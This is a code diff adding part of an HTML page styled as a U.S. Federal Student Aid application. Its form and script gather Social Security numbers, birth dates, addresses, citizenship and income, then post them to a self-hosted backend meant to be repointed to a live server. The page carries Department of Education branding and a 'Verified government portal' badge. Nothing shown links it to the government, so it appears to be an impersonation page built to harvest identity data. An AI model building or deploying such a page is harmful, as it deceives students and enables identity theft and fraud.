+              <label>4 — Do you have children who receive more than half of their support from you? <span class="req">*</span></label>
+              <div class="pill-group">
+                <label class="pill-option"><input type="radio" name="dep4" value="yes"> Yes</label>
+                <label class="pill-option"><input type="radio" name="dep4" value="no"> No</label>
+              </div>
+            </div>
+            <div class="field">
+              <label>5 — Are you a veteran or active duty member of the U.S. Armed Forces? <span class="req">*</span></label>
+              <div class="pill-group">
+                <label class="pill-option"><input type="radio" name="dep5" value="yes"> Yes</label>
+                <label class="pill-option"><input type="radio" name="dep5" value="no"> No</label>
+              </div>
+            </div>
+          </div>
+
+          <div class="dep-result-box" id="depResultBox"></div>
+
+          <div class="fields-block">
+            <div class="field-group-label">Household Income</div>
+            <div class="field-row field-row-2">
+              <div class="field">
+                <label>Estimated Annual Household Income <span class="req">*</span></label>
+                <input type="number" id="annualIncome" class="form-control-new" placeholder="e.g. 48000" min="0" inputmode="numeric"/>
+                <span class="field-hint">Enter total gross income from your most recent tax year (USD)</span>
+                <span class="field-err" id="annualIncomeErr">Annual income is required</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Certification -->
+          <div class="cert-block">
+            <label>
+              <input type="checkbox" id="certify"/>
+              <span>I certify that all information provided in this application is <strong>true, complete, and accurate</strong> to the best of my knowledge. I understand that providing false or misleading information is a federal crime and may result in criminal prosecution, fines, or imprisonment under 18 U.S.C. § 1001.</span>
+            </label>
+            <span class="field-err" id="certifyErr" style="margin-top:8px; margin-left:30px;">You must certify before submitting</span>
+          </div>
+          <div style="height:24px;"></div>
+
+        </div><!-- /step-5 -->
+
+        <!-- NAVIGATION BAR -->
+        <div class="form-nav-bar">
+          <button class="btn-nav-back" id="prevBtn" onclick="navigate(-1)" style="visibility:hidden;">← Back</button>
+          <span class="step-indicator" id="stepCount">Step 1 of 5</span>
+          <button class="btn-nav-next" id="nextBtn" onclick="navigate(1)">Continue →</button>
+        </div>
+
+      </div><!-- /form-card -->
+    </div>
+
+    <!-- ═══════════════════════════════
+         SIDEBAR
+    ═══════════════════════════════ -->
+    <aside class="sidebar">
+
+      <div class="sb-card">
+        <div class="sb-card-head">Security &amp; Privacy</div>
+        <div class="sb-card-body">
+          <ul class="sb-sec-list">
+            <li><div class="sb-icon">🔒</div> 256-bit SSL encryption</li>
+            <li><div class="sb-icon">🛡</div> FERPA &amp; Privacy Act compliant</li>
+            <li><div class="sb-icon">🚫</div> SSN never stored in plain text</li>
+            <li><div class="sb-icon">✅</div> Verified government portal</li>
+            <li><div class="sb-icon">📋</div> Data used only for aid determination</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="sb-card">
+        <div class="sb-card-head">Documents to Have Ready</div>
+        <div class="sb-card-body">
+          <ul class="sb-doc-list">
+            <li>Social Security Number</li>
+            <li>Government-issued photo ID</li>
+            <li>Federal tax returns (last year)</li>
+            <li>W-2 forms &amp; bank statements</li>
+            <li>School enrollment information</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="sb-card sb-help-card">
+        <div class="sb-card-head">Need Assistance?</div>
+        <div class="sb-help-body">
+          <p>Our counselors are available Monday – Friday, 8 AM to 8 PM Eastern Time.</p>
+          <a href="tel:18004334636" class="sb-call-btn">📞 1-800-433-4636</a>
+          <a href="faq.html" class="sb-faq-link">View Help &amp; FAQ →</a>
+        </div>
+      </div>
+
+    </aside>
+
+  </div><!-- /app-wrap -->
+</main>
+
+<!-- FOOTER -->
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-bottom" style="padding:20px 0;">
+      <span>© 2026 U.S. Department of Education. Federal Student Aid.</span>
+      <div style="display:flex;gap:14px;flex-wrap:wrap;align-items:center;">
+        <a href="privacy.html" style="color:rgba(255,255,255,.55);font-size:.8rem;">Privacy Policy</a>
+        <a href="faq.html" style="color:rgba(255,255,255,.55);font-size:.8rem;">Help &amp; FAQ</a>
+        <span class="secure-badge">🔒 Encrypted</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script>
+  /* ──────────────────────────────────
+     Alias: .form-control-new → same
+     look as .field input/select
+  ────────────────────────────────── */
+  // (handled purely in CSS above)
+
+  /* ──────────────────────────────────
+     State
+  ────────────────────────────────── */
+  let currentStep = 1;
+  const TOTAL = 5;
+
+  const headings = [
+    '',
+    'Section 1 — Student Identity',
+    'Section 2 — Contact Information',
+    'Section 3 — Demographics',
+    'Section 4 — Educational Background',
+    'Section 5 — Dependency &amp; Income'
+  ];
+
+  /* ──────────────────────────────────
+     SSN formatting & toggle
+  ────────────────────────────────── */
+  const ssnInput  = document.getElementById('ssn');
+  const ssnToggle = document.getElementById('ssnToggle');
+  let ssnVisible  = false;
+
+  ssnInput.addEventListener('input', () => {
+    // Save cursor position
+    const pos = ssnInput.selectionStart;
+    let raw = ssnInput.value.replace(/\D/g, '');
+    if (raw.length > 9) raw = raw.slice(0, 9);
+    let formatted = raw;
+    if (raw.length > 5)      formatted = raw.slice(0,3) + '-' + raw.slice(3,5) + '-' + raw.slice(5);
+    else if (raw.length > 3) formatted = raw.slice(0,3) + '-' + raw.slice(3);
+    ssnInput.value = formatted;
+  });
+
+  ssnToggle.addEventListener('click', () => {
+    ssnVisible = !ssnVisible;
+    // Toggle CSS masking class instead of changing input type
+    ssnInput.classList.toggle('ssn-masked', !ssnVisible);
+    ssnToggle.textContent = ssnVisible ? 'Hide' : 'Show';
+  });
+
+  /* ──────────────────────────────────
+     Phone formatting
+  ────────────────────────────────── */
+  document.getElementById('phone').addEventListener('input', function () {
+    let v = this.value.replace(/\D/g, '');
+    if (v.length > 10) v = v.slice(0, 10);
+    if (v.length > 6)      v = '(' + v.slice(0,3) + ') ' + v.slice(3,6) + '-' + v.slice(6);
+    else if (v.length > 3) v = '(' + v.slice(0,3) + ') ' + v.slice(3);
+    this.value = v;
+  });
+
+  /* ──────────────────────────────────
+     Dependency result
+  ────────────────────────────────── */
+  document.querySelectorAll('input[name^="dep"]').forEach(r => r.addEventListener('change', updateDep));
+
+  function updateDep() {
+    const checked = document.querySelectorAll('input[name^="dep"]:checked');
+    const anyYes  = Array.from(checked).some(r => r.value === 'yes');
+    const box     = document.getElementById('depResultBox');
+    if (checked.length === 0) { box.style.display = 'none'; return; }
+    box.style.display = 'block';
+    if (anyYes) {
+      box.className = 'dep-result-box independent';
+      box.textContent = '✔  Independent Student — parental financial information is not required.';
+    } else {
+      box.className = 'dep-result-box dependent';
+      box.textContent = 'ℹ  Dependent Student — parental financial data will be required to complete your aid package.';
+    }
+  }
+
+  /* ──────────────────────────────────
+     Validation
+  ────────────────────────────────── */
+  function validate(step) {
+    let ok = true;
+
+    function setErr(inputId, errId, hasError) {
+      const el = document.getElementById(inputId);
+      const em = document.getElementById(errId);
+      if (!el || !em) return;
+      el.classList.toggle('error', hasError);
+      em.classList.toggle('show', hasError);
+      if (hasError) ok = false;
+    }
+
+    function reqField(inputId, errId) {
+      const el = document.getElementById(inputId);
+      if (!el) return;
+      setErr(inputId, errId, !el.value.trim());
+    }
+
+    if (step === 1) {
+      reqField('firstName', 'firstNameErr');
+      reqField('lastName',  'lastNameErr');
+      reqField('dob',       'dobErr');
+      setErr('ssn', 'ssnErr', !/^\d{3}-\d{2}-\d{4}$/.test(ssnInput.value));
+    }
+
+    if (step === 2) {
+      reqField('address1', 'address1Err');
+      reqField('city',     'cityErr');
+      reqField('state',    'stateErr');
+      setErr('zip',   'zipErr',   !/^\d{5}$/.test(document.getElementById('zip').value));
+      setErr('phone', 'phoneErr', document.getElementById('phone').value.replace(/\D/g,'').length < 10);
+      setErr('email', 'emailErr', !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(document.getElementById('email').value));
+    }
+
+    if (step === 3) {
+      reqField('citizenship', 'citizenshipErr');
+      const ms = document.getElementById('maritalSelect');
+      setErr('maritalSelect', 'maritalErr', !ms.value);
+    }
+
+    if (step === 4) {
+      reqField('hsName',      'hsNameErr');
+      reqField('hsGrad',      'hsGradErr');
+      reqField('collegeName', 'collegeNameErr');
+      reqField('degreeLevel', 'degreeLevelErr');
+      reqField('enrollStatus','enrollStatusErr');
+    }
+
+    if (step === 5) {
+      reqField('annualIncome', 'annualIncomeErr');
+      const cert = document.getElementById('certify');
+      setErr('certify', 'certifyErr', !cert.checked);
+    }
+
+    return ok;
+  }
+
+  /* ──────────────────────────────────
+     API base URL — change this to your
+     live server URL when you deploy
+  ────────────────────────────────── */
+  const API_BASE = 'http://localhost:5000/api';
+
+  /* ──────────────────────────────────
+     Navigation
+  ────────────────────────────────── */
+  function navigate(dir) {
+    if (dir === 1 && !validate(currentStep)) return;
+    if (dir === 1 && currentStep === TOTAL) {
+      submitToAPI();   // submit to backend on final step
+      return;
+    }
+    const prev = currentStep;
+    currentStep = Math.min(TOTAL, Math.max(1, currentStep + dir));
+    updateUI(prev);
+  }
+
+  /* ──────────────────────────────────
+   Collect all form fields into one object
+─────────────────────────────────── */
+function collectFormData() {
+  const get = id => { const el = document.getElementById(id); return el ? el.value.trim() : ''; };
+  const radio = name => { const el = document.querySelector(`input[name="${name}"]:checked`); return el ? el.value : ''; };
+  return {
+    // Step 1
+    firstName:        get('firstName'),
+    middleName:       get('middleName'),
+    lastName:         get('lastName'),
+    suffix:           get('suffix'),
+    dateOfBirth:      get('dob'),
+    ssn:              get('ssn'),
+    // Step 2
+    addressLine1:     get('address1'),
+    addressLine2:     get('address2'),
+    city:             get('city'),
+    state:            get('state'),
+    zipCode:          get('zip'),
+    phoneNumber:      get('phone'),
+    email:            get('email'),
+    // Step 3
+    gender:           radio('gender'),
+    citizenshipStatus: get('citizenship'),
+    maritalStatus:    get('maritalSelect'),
+    // Step 4
+    highSchoolName:   get('hsName'),
+    graduationYear:   get('hsGrad'),
+    collegeName:      get('collegeName'),
+    degreeLevel:      get('degreeLevel'),
+    enrollmentStatus: get('enrollStatus'),
+    // Step 5
+    annualIncome:     parseFloat(get('annualIncome')) || 0,
+    dep1: radio('dep1'), dep2: radio('dep2'), dep3: radio('dep3'),
+    dep4: radio('dep4'), dep5: radio('dep5'),
+  };
+}
+
+/* ──────────────────────────────────
+   Submit to backend API
+─────────────────────────────────── */
+async function submitToAPI() {
+  const nextBtn = document.getElementById('nextBtn');
+
+  // Show loading state on button
+  nextBtn.disabled    = true;
+  nextBtn.textContent = '⏳ Submitting...';
+  nextBtn.style.opacity = '0.7';
+
+  const formData = collectFormData();
+
+  // Also save to sessionStorage for review page fallback
+  sessionStorage.setItem('fsaApp', JSON.stringify(formData));
+
+  try {
+    const response = await fetch(`${API_BASE}/applications`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(formData)
+    });
+
+    const result = await response.json();
+
+    if (response.ok && result.success) {
+
+      const confirmationNumber = result.confirmationNumber;
+
+      // ✅ SEND EMAIL (NEW)
+      let emailSent = true;
+
+      try {
+        const emailRes = await fetch(`${API_BASE}/email`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: formData.email,
+            firstName: formData.firstName,
+            confirmationNumber
+          })
+        });
+
+        const emailData = await emailRes.json();
+        emailSent = emailData.success;
+
+      } catch (err) {
+        console.error('Email error:', err);
+        emailSent = false;
+      }
+
+      // Save confirmation data for the confirmation page
+      sessionStorage.setItem('fsaConf', JSON.stringify({
+        confirmationNumber: confirmationNumber,
+        firstName:          formData.firstName,
+        lastName:           formData.lastName,
+        email:              formData.email,
+        emailSent:          emailSent, // 👈 added
+        submittedAt:        new Date().toLocaleString('en-US')
+      }));
+      
+      window.location.href = 'confirmation.html';
+
+    } else {
+      // API returned an error — show it to the user
+      showSubmitError(result.error || 'Submission failed. Please try again.');
+      resetButton();
+    }
+  } catch (err) {
+    console.error('API error:', err);
+    showSubmitError('Network error. Please try again later.');
+    resetButton();
+  }
+}
+  function resetButton() {
+    const nextBtn = document.getElementById('nextBtn');
+    nextBtn.disabled    = false;
+    nextBtn.textContent = 'Submit & Review →';
+    nextBtn.style.opacity = '1';
+  }
+
+  function showSubmitError(msg) {
+    let box = document.getElementById('submitErrBox');
+    if (!box) {
+      box = document.createElement('div');
+      box.id = 'submitErrBox';
+      box.style.cssText = `
+        margin: 0 32px 16px; padding: 14px 18px;
+        background: #fce8e6; border-left: 4px solid #b00020;
+        border-radius: 5px; font-size: .88rem; color: #b00020;
+        font-weight: 600; display: flex; align-items: center; gap: 8px;
+      `;
+      const navBar = document.querySelector('.form-nav-bar');
+      navBar.parentNode.insertBefore(box, navBar);
+    }
+    box.innerHTML = '⚠ ' + msg;
+    box.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+
+  function updateUI(prev) {
+    document.getElementById(`step-${prev}`).classList.remove('active');
+    document.getElementById(`step-${currentStep}`).classList.add('active');
+
+    // Progress indicators
+    document.querySelectorAll('.prog-step').forEach(el => {
+      const s = parseInt(el.dataset.step);
+      el.classList.remove('active', 'completed');
+      if (s < currentStep) el.classList.add('completed');
+      if (s === currentStep) el.classList.add('active');
+      const circle = el.querySelector('.prog-circle');
+      if (s < currentStep) circle.textContent = '✓';
+      else circle.textContent = s;
+    });
+
+    // Heading
+    document.getElementById('formHeadTitle').innerHTML = headings[currentStep];
+
+    // Buttons
+    const prevBtn = document.getElementById('prevBtn');
+    const nextBtn = document.getElementById('nextBtn');
+    prevBtn.style.visibility = currentStep > 1 ? 'visible' : 'hidden';
+    if (currentStep === TOTAL) {
+      nextBtn.textContent = 'Submit & Review →';
+      nextBtn.classList.add('submit-btn');
+    } else {
+      nextBtn.textContent = 'Continue →';
+      nextBtn.classList.remove('submit-btn');
+    }
+
+    document.getElementById('stepCount').textContent = `Step ${currentStep} of ${TOTAL}`;
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  /* ──────────────────────────────────
+     Hamburger
+  ────────────────────────────────── */
+  document.getElementById('hamburger').addEventListener('click', () => {
+    document.getElementById('mobileMenu').classList.toggle('open');
+  });
+
+  /* ──────────────────────────────────
+     Live "has-value" class on inputs
+     so filled fields get subtle style
+  ────────────────────────────────── */
+  document.querySelectorAll('.form-control-new').forEach(el => {
+    el.addEventListener('input', () => el.classList.toggle('has-value', !!el.value));
+    el.addEventListener('change', () => el.classList.toggle('has-value', !!el.value));
+  });
+</script>
+</body>
+</html>
